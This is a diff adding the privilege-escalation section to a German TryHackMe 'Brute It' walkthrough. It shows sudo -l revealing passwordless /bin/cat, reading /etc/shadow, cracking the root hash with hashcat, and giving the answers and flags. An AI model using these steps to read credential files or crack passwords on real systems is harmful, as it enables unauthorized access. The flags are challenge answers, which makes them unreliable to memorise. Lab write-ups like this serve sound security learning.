@@ -10,7 +10,9 @@ Ziel des Raums ist es, etwas über brute-forcing, hash cracking und privilege es
 - nmap
 - gobuster
 - hydra
-- 
+- ssh2john
+- john
+- hashcat
 ````
 
 ## Task 2 - Reconnaissance
@@ -186,4 +188,59 @@ Answer: THM{brut3_f0rce_is_e4sy}
 
 ## Task 4 - Privilege Escalation
 
+Da grade in der Auflistung zu sehen war, dass es eine .sudo_as_admin_successful-Datei im home-dir von john gibt, wird er etwas als root ausführen können.
+Die Vermutung überprüfe ich mit ````sudo -l````
 
+````
+john@bruteit:~$ sudo -l
+Matching Defaults entries for john on bruteit:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on bruteit:
+    (root) NOPASSWD: /bin/cat
+````
+
+Dann ist der Rest ja ein Kinderspiel! In /etc/shadow finde ich das Hash vom Root-Passwort, welches ich mit Hashcat cracke:
+
+````hashcat -a 0 -m 1800 '$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.' ~/rockyou.txt
+<Schnipp>
+$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:football
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: sha512crypt $6$, SHA512 (Unix)
+Hash.Target......: $6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ...XEVgL.
+Time.Started.....: Mon Nov 23 13:57:16 2020 (3 secs)
+Time.Estimated...: Mon Nov 23 13:57:19 2020 (0 secs)
+Guess.Base.......: File (/home/shendayan/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     5803 H/s (11.12ms) @ Accel:128 Loops:16 Thr:32 Vec:1
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 20480/14344385 (0.14%)
+Rejected.........: 0/20480 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
+Candidates.#1....: 123456 -> michelle4
+Hardware.Mon.#1..: Temp: 57c Util:100% Core:1721MHz Mem:3504MHz Bus:8
+
+Started: Mon Nov 23 13:56:55 2020
+Stopped: Mon Nov 23 13:57:21 2020
+````
+Die root.txt kann man dann auf die selbe Art auslesen, wie /etc/shadow:
+````sudo cat /root/root.txt````
+Oder man wechselt eben zu root mit ````su root````, das Passwort hat Hashcat ja schon verraten :)
+
+
+Question 1: Find a form to escalate your privileges. What is the root's password? 
+
+Answer: football
+
+Question 2: root.txt
+
+Answer: THM{pr1v1l3g3_3sc4l4t10n}
+
+Ich hoffe mit diesem Walkthrough war es kein Problem mehr, diesen Raum zu bewältigen.
+
+Danke für’s Lesen und happy pwning!
+
+Kontakt -> Twitter
